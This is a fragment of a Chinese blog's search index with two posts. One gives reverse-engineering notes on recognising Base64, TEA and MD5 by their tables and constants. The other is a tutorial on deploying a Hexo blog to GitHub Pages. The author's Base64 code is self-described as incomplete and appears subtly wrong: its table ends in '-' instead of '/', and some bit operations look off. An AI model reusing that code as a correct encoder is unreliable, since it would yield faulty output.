<p>在重新分配完6个字节后 会在==6位字节前部补0== 将字节补成八位 也就是说 此时字节最大值为 <em>00111111=63</em><br>此时 Base64算法会将此时的字节所代表的的十进制数作为下标来索引表中进行替换 索引表如下<br>| 编号 | 字符 | 编号 | 字符 | 编号 | 字符 | 编号 | 字符 |<br>|—-|—-|—-|—-|—-|—-|—-|—-|<br>| 0  | A  | 16 | Q  | 32 | g  | 48 | w  |<br>| 1  | B  | 17 | R  | 33 | h  | 49 | x  |<br>| 2  | C  | 18 | S  | 34 | i  | 50 | y  |<br>| 3  | D  | 19 | T  | 35 | j  | 51 | z  |<br>| 4  | E  | 20 | U  | 36 | k  | 52 | 0  |<br>| 5  | F  | 21 | V  | 37 | l  | 53 | 1  |<br>| 6  | G  | 22 | W  | 38 | m  | 54 | 2  |<br>| 7  | H  | 23 | X  | 39 | n  | 55 | 3  |<br>| 8  | I  | 24 | Y  | 40 | o  | 56 | 4  |<br>| 9  | J  | 25 | Z  | 41 | p  | 57 | 5  |<br>| 10 | K  | 26 | a  | 42 | q  | 58 | 6  |<br>| 11 | L  | 27 | b  | 43 | r  | 59 | 7  |<br>| 12 | M  | 28 | c  | 44 | s  | 60 | 8  |<br>| 13 | N  | 29 | d  | 45 | t  | 61 | 9  |<br>| 14 | O  | 30 | e  | 46 | u  | 62 |+  |<br>| 15 | P  | 31 | f  | 47 | v  | 63 |/|</p>
<figure class="image-box">
                <img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMwLmNuYmxvZ3MuY29tL2Jsb2cvNDM0MTAxLzIwMTIxMi8yNjE0MTEyMS04Y2RlYmJmMjQwZDg0YWY4YTZiOGE2ZThkNmQwYmEzNC5qcGc?x-oss-process=image/format,png" alt title class>
                <p></p>
            </figure>
<p>Base64算法在逆向中的体现 主要就在于==程序内存中存在一个索引表==<br><em>同理 如果是Base64解密 内存中当然存在一个解密表</em></p>
<p>并且在程序算法中存在明显的 右移2位和右移4位等明显位运算操作<br><em>同理 如果是Base64解密 应该存在左移2位和左移4位等明显的位运算操作</em></p>
<p>但是注意 Base64是可以设计变种的 即更改索引表来实现变种加密 后续还是需要自己实现下Base64加密的算法 以达到就算是更改了索引表依旧能成功解密的水平</p>
<p>具体算法设计可以查看<br><strong><a href="https://www.jianshu.com/p/61833e529cfc" target="_blank" rel="noopener">https://www.jianshu.com/p/61833e529cfc</a></strong></p>
<p><em>Base64加密代码简单实现</em></p>
<blockquote>
<p>在研究了一下午之后 写出了不完全的Base64加密算法 仅支持三位及以下的加密 代码以后会继续完善 仅供查看Base64加密的代码特征</p>
</blockquote>
<pre class=" language-C"><code class="language-C">#include <iostream>
using namespace std;

char sy[64]=
{
    'A','B','C','D','E','F',
    'G','H','I','J','K','L',
    'M','N','O','P','Q','R',
    'S','T','U','V','W','X',
    'Y','Z','a','b','c','d',
    'e','f','g','h','i','j',
    'k','l','m','n','o','p',
    'q','r','s','t','u','v',
    'w','x','y','z','0','1',
    '2','3','4','5','6','7',
    '8','9','+','-' 
};
char ans[100];
void EnBase64()
{
    int i=0;
    while(1)
    {
        int tmp1=0,tmp2=0,tmp3=0,tmp4=0;
        char a[3]={' ',' ',' '};
        cin>>a;
        if(a[0]=='#')
        {
            break;
        }

        tmp1=a[0]>>2;
        ans[i]=sy[tmp1];
        i++;

        if(a[1]=='#')
        {
            tmp2=(a[0]&3)<<4>>2;
            ans[i]=sy[tmp2];
            i++;
            ans[i]='=';
            break;    
        }

        tmp2=((a[1]>>2)|((a[0]&3)<<6))>>2;
        ans[i]=sy[tmp2];
        i++;

        if(a[2]=='#')
        {
            tmp3=(a[1]&15)<<4>>2;
            ans[i]=sy[tmp3];
            i++;
            ans[i]='=';
            break;
        }

        tmp3=(((a[1]&15)<<4)|((a[2]&192)>>4))>>2;
        ans[i]=sy[tmp3];
        i++;

        tmp4=(a[2]&63);
        ans[i]=sy[tmp4];
        i++;
        //cout<<"000";
    }    
}


int main(void)
{
    int i=0;
    EnBase64();
    cout<<ans; } < code></ans;></iostream></code></pre><code class="language-C">
<h2 id="Tea"><a href="#Tea" class="headerlink" title="Tea"></a>Tea</h2><p>在密码学中，微型加密算法（Tiny Encryption Algorithm，TEA）是一种易于描述和执行的块密码，通常只需要很少的代码就可实现。其设计者是剑桥大学计算机实验室的大卫 · 惠勒与罗杰 · 尼达姆</p>
<p>Tea的实现代码比较固定 这里给出常见Tea加密的实现代码</p>
<pre class=" language-C"><code class="language-C">#include <stdint.h>

void encrypt (uint32_t* v, uint32_t* k) {
    uint32_t v0=v[0], v1=v[1], sum=0, i;           /* set up */
    uint32_t delta=0x9e3779b9;                     /* a key schedule constant */
    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */
    for (i=0; i < 32; i++) {                       /* basic cycle start */
        sum += delta;
        v0 += ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
        v1 += ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);  
    }                                              /* end cycle */
    v[0]=v0; v[1]=v1;
}

void decrypt (uint32_t* v, uint32_t* k) {
    uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i;  /* set up */
    uint32_t delta=0x9e3779b9;                     /* a key schedule constant */
    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */
    for (i=0; i<32; i++) {                         /* basic cycle start */
        v1 -= ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);
        v0 -= ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
        sum -= delta;                                   
    }                                              /* end cycle */
    v[0]=v0; v[1]=v1;
}</stdint.h></code></pre>
<p>Tea加密的明显特征是 ==存在一个Image Number:0x9e3779b9== </p>
<h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><p>MD5 消息摘要算法（英语：MD5 Message-Digest Algorithm），一种被广泛使用的密码散列函数，可以产生出一个 128 位（16 字节）的散列值（hash value），用于确保信息传输完整一致。MD5 由美国密码学家罗纳德 · 李维斯特（Ronald Linn Rivest）设计，于 1992 年公开，用以取代 MD4 算法。这套算法的程序在 RFC 1321 中被加以规范</p>
<p>这里给出MD5实现的伪代码</p>
<pre class=" language-C"><code class="language-C">    /Note: All variables are unsigned 32 bits and wrap modulo 2^32 when calculating
    var int[64] r, k

    //r specifies the per-round shift amounts
    r[ 0..15]：= {7, 12, 17, 22,  7, 12, 17, 22,  7, 12, 17, 22,  7, 12, 17, 22} 
    r[16..31]：= {5,  9, 14, 20,  5,  9, 14, 20,  5,  9, 14, 20,  5,  9, 14, 20}
    r[32..47]：= {4, 11, 16, 23,  4, 11, 16, 23,  4, 11, 16, 23,  4, 11, 16, 23}
    r[48..63]：= {6, 10, 15, 21,  6, 10, 15, 21,  6, 10, 15, 21,  6, 10, 15, 21}

    //Use binary integer part of the sines of integers as constants:
    for i from 0 to 63
        k[i] := floor(abs(sin(i + 1)) × 2^32)

    //Initialize variables:
    var int h0 := 0x67452301
    var int h1 := 0xEFCDAB89
    var int h2 := 0x98BADCFE
    var int h3 := 0x10325476

    //Pre-processing:
    append "1" bit to message
    append "0" bits until message length in bits ≡ 448 (mod 512)
    append bit length of message as 64-bit little-endian integer to message

    //Process the message in successive 512-bit chunks:
    for each 512-bit chunk of message
        break chunk into sixteen 32-bit little-endian words w[i], 0 ≤ i ≤ 15

    //Initialize hash value for this chunk:
    var int a := h0
    var int b := h1
    var int c := h2
    var int d := h3

    //Main loop:
    for i from 0 to 63
        if 0 ≤ i ≤ 15 then
            f := (b and c) or ((not b) and d)
            g := i
        else if 16 ≤ i ≤ 31
            f := (d and b) or ((not d) and c)
            g := (5×i + 1) mod 16
        else if 32 ≤ i ≤ 47
            f := b xor c xor d
            g := (3×i + 5) mod 16
        else if 48 ≤ i ≤ 63
            f := c xor (b or (not d))
            g := (7×i) mod 16

        temp := d
        d := c
        c := b
        b := leftrotate((a + f + k[i] + w[g]),r[i]) + b
        a := temp
    Next i
    //Add this chunk's hash to result so far:
    h0 := h0 + a
    h1 := h1 + b 
    h2 := h2 + c
    h3 := h3 + d
    End ForEach var int digest := h0 append h1 append h2 append h3 //(expressed as little-endian)</code></pre>
<p>MD5算法的显著特征就是 ==存在4个变量 h0=0x67452301 h1=0xefcdab89 h2=0x98badcfe h3=0x10325476==</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script></code></body></html>]]></content>
      
        
        <tags>
            
            <tag> RE </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[使用Hexo配合Github搭建自己的博客]]></title>
      <url>/2019/10/08/shi-yong-hexo-pei-he-github-da-jian-zi-ji-de-bo-ke/</url>
      <content type="html"><![CDATA[<html><head></head><body><h2 id="下载工具"><a href="#下载工具" class="headerlink" title="下载工具"></a>下载工具</h2><p><strong>1.安装Git Bash</strong></p>
<p><a href="https://gitforwindows.org/" target="_blank" rel="noopener">下载地址</a></p>
<p>安装流程: 无脑下一步即可<br>安装好后 在任意处右键打开Git Bash 输入</p>
<blockquote>
<p>git version</p>
</blockquote>
<p>来查看当前的Git Bash版本 如果客户端正常显示版本即为安装成功</p>
<p><strong>2.安装Node JS</strong></p>
<p>由于Hexo是基于Node JS环境的静态博客 所以一般来说还是装一下吧…<br><a href="https://nodejs.org/en/" target="_blank" rel="noopener">下载地址</a></p>
<p>安装流程:下载好之后双击安装 注意勾选 <kbd>Add to Path</kbd> 这样做的好处就是不用自己去配置环境变量了 然后继续下一步即可</p>
<p><strong>3.安装Hexo</strong></p>
<p>这就是我们博客的关键了 不用紧张 我们不需要去费尽心思的找安装包 直接创建一个文件夹(以后存放博客的地方) 然后进入文件夹 右键<kbd>Git Bash here</kbd> 然后输入安装命令 <kbd>npm i -g hexo</kbd>静等安装完毕即可 </p>
<p>在安装完Hexo后就是初始化了 输入初始化命令<br><kbm>hexo init</kbm> 然后等待完成即可</p>
<h2 id="连接Github"><a href="#连接Github" class="headerlink" title="连接Github"></a>连接Github</h2><p>没有账号的创建账号 这就不说了..有了账号的 新建仓库 仓库名称<strong>必须</strong>为 <strong>自己的用户名.github.io</strong></p>
<p>在创建完成后 返回到gitbash中 来配置自己的github账户信息</p>
<p>在Git Bash中输入 </p>
<p><kbm>git config –global user.name “自己的github用户名”</kbm></p>
<p><kbm>git config –global user.email “自己注册github的邮箱”</kbm></p>
<p>接下来就是创建SSH keys将gitbash和github连接起来 在bash中输入 </p>
<p><kbm>ssh-keygen -t rsa -C “自己的邮箱”</kbm></p>
<p>然后使用git命令 来复制ssh key</p>
<p><kbm>paste < ~/.ssh/id_rsa.pub</kbm></p>
<p>接着打开github的账户设置 选择<em>SSH and GPG keys</em> 然后<em>New SSH key</em> 标题随便填 把复制好的ssh粘进去就完事了 确定粘完之后回到bash 测试是否成功</p>
<p><kbm>ssh -T <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a> </kbm></p>
<p>如果提示 <kbm>Are you sure you want to continue connecting (yes/no)?</kbm> 输入yes 然后就会看到</p>
<blockquote>
<p>Hi ***! You’ve successfully authenticated, but GitHub does not provide shell access.</p>
</blockquote>
<p>这个时候SSH已经配置成功了 </p>
<h2 id="配置博客"><a href="#配置博客" class="headerlink" title="配置博客"></a>配置博客</h2><p>这个时候博客的雏形已经搭建出来了 就是有点丑..我们先去github上 随便找个自己喜欢的主题<br>然后放到<strong>博客根目录下的themes</strong>里即可</p>
<p>然后打开 <strong>_config.yml</strong> 来具体配置博客的信息 如图所示修改属于自己的信息 将Du4t改成自己的github用户名即可</p>
<figure class="image-box">
                <img src="https://i.loli.net/2019/10/08/zuGNOlStARIfHdw.png" alt="1.png" title="配置1" class>
                <p>配置1</p>
            </figure>
<figure class="image-box">
                <img src="https://i.loli.net/2019/10/08/9vPSRmlU61AyGIk.png" alt="2.png" title="配置2" class>
                <p>配置2</p>
            </figure>

<h2 id="书写自己的博客"><a href="#书写自己的博客" class="headerlink" title="书写自己的博客"></a>书写自己的博客</h2><p>在bash中输入<kbm>hexo new 文章名</kbm> 然后就可以去_post文件夹中找到自己的博客了 使用MarkDown语法书写自己的博文即可</p>
<h2 id="上传github"><a href="#上传github" class="headerlink" title="上传github"></a>上传github</h2><p>还是先安装一波 <kbm>npm install hexo-deployer-git –save</kbm> 安装完成后我们就可以通过bash直接将自己的博客部署到github上让别人看到了 </p>
<p><em>建议每次都按照以下步骤部署自己的博客！</em></p>
<p><kbm>hexo clean</kbm></p>
<p><kbm>hexo g</kbm></p>
<p><kbm>hexo d</kbm></p>
<p>等待部署完毕 去 <em>自己的用户名.github.io</em> 就可以看到自己的博客了</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script></body></html>]]></content>
      
        
        <tags>
            
            <tag> Others </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
